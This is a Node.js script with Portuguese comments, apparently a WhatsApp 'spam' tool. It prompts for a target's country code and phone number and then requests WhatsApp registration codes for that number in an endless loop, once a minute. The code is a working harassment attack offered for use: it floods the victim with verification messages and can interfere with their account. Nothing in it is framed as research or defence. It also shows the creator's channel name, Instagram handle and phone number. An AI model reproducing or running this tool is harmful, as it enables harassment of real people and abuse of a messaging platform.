import prompt from 'prompt-sync';
import gradient from 'gradient-string';
import pino from 'pino';
import fs from 'fs';
import { useMultiFileAuthState, makeWASocket } from '@whiskeysockets/baileys';

// Definindo informações do criador
const creatorInfo = {
    channelName: 'TSXMODZ',
    instagram: '@eu_luan_xz',
    whatsapp: '+55 66 9281-8852'
};

// Função para exibir informações do criador com cores vibrantes
const displayCreatorInfo = () => {
    console.clear();
    const separator = gradient(['#ff00ff', '#8a2be2', '#4b0082'])('■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■');
    console.log(separator);
    console.log(gradient(['#ff00ff', '#8a2be2', '#4b0082'])('Informações do Criador:'));
    console.log(gradient(['#ff00ff', '#ff1493', '#ff4500'])(`Canal: ${creatorInfo.channelName}`));
    console.log(gradient(['#ff00ff', '#ff1493', '#ff4500'])(`Instagram: ${creatorInfo.instagram}`));
    console.log(gradient(['#ff00ff', '#ff1493', '#ff4500'])(`WhatsApp: ${creatorInfo.whatsapp}`));
    console.log(separator);
};

// Função para exibir "Carregando" com troca de cores
const showLoading = (duration = 6000) => {
    return new Promise((resolve) => {
        const loadingTexts = ['Carregando', 'Carregando.', 'Carregando..', 'Carregando...'];
        let index = 0;

        const interval = setInterval(() => {
            console.clear();
            console.log(gradient(['#ff00ff', '#ff1493', '#ff4500'])(loadingTexts[index]));
            index = (index + 1) % loadingTexts.length; // Alterna entre os textos
        }, 500); // Troca de cor e texto a cada 500ms para efeito mais dinâmico

        // Após o tempo definido (por padrão 6 segundos), resolve a promessa e continua o código
        setTimeout(() => {
            clearInterval(interval);
            resolve(); // Continua o código
        }, duration);
    });
};

// Carregar números de um arquivo JSON
const loadNumbers = () => {
    try {
        const data = fs.readFileSync('./files/numbers.json');
        return JSON.parse(data);
    } catch (error) {
        console.error(gradient(['#ff00ff', '#8a2be2', '#4b0082'])('Erro ao carregar números: ' + error));
        return {}; // Retorna um objeto vazio se houver erro
    }
};

// Função para solicitar o código de verificação
const requestVerificationCode = async (spam, { phoneNumber, ddi, number }) => {
    while (true) {
        try {
            console.clear();
            console.log(gradient(['#ff00ff', '#ff1493', '#ff4500'])(`[+] Solicitando código para ${ddi}${number}`));
            
            const res = await spam.requestRegistrationCode({
                phoneNumber: `+${phoneNumber}`,
                phoneNumberCountryCode: ddi,
                phoneNumberNationalNumber: number,
                phoneNumberMobileCountryCode: 724
            });

            if (res.reason === 'temporarily_unavailable') {
                console.log(gradient(['#ff00ff', '#ff1493', '#ff4500'])(`Serviço temporariamente indisponível. Tentando novamente em ${res.retry_after} segundos.`));
                setTimeout(() => requestVerificationCode(spam, { phoneNumber, ddi, number }), res.retry_after * 1000);
                return;
            } else {
                console.log(gradient(['#ff00ff', '#ff1493', '#ff4500'])('Código solicitado com sucesso!'));
            }
            
            // Aguardar 1 minuto antes de permitir outra solicitação
            await new Promise(resolve => setTimeout(resolve, 60000));
        } catch (error) {
            console.error(gradient(['#ff00ff', '#ff1493', '#ff4500'])('Erro ao solicitar código: ' + error));
        }
    }
};

// Função principal para iniciar o aplicativo
const start = async () => {
    await showLoading(); // Exibe "Carregando" por 6 segundos antes de continuar
    displayCreatorInfo(); // Exibe as informações do criador

    // Carregar estado de autenticação para o socket
    const { state, saveCreds } = await useMultiFileAuthState('.auth_info');

    const spam = makeWASocket({
        auth: state,
        mobile: true,
        logger: pino({ level: 'silent' }) // Reduz a quantidade de logs desnecessários
    });

    const numbers = loadNumbers(); // Carregar números existentes do arquivo JSON

    // Instanciar o prompt
    const input = prompt();

    // Entrada do DDI e número com validação
    const ddi = input(gradient(['#ff00ff', '#ff1493', '#ff4500'])('</> Digite o DDI do alvo: ')).trim();
    const number = input(gradient(['#ff00ff', '#ff1493', '#ff4500'])('</> Digite o número do alvo: ')).trim();
    const phoneNumber = ddi + number;

    // Armazenar número no arquivo JSON
    numbers[phoneNumber] = { ddi, number };
    fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, 4)); // Formatação melhorada para JSON

    // Solicitar o código de verificação
    await requestVerificationCode(spam, { phoneNumber, ddi, number });
};

// Iniciar a execução do aplicativo
start();
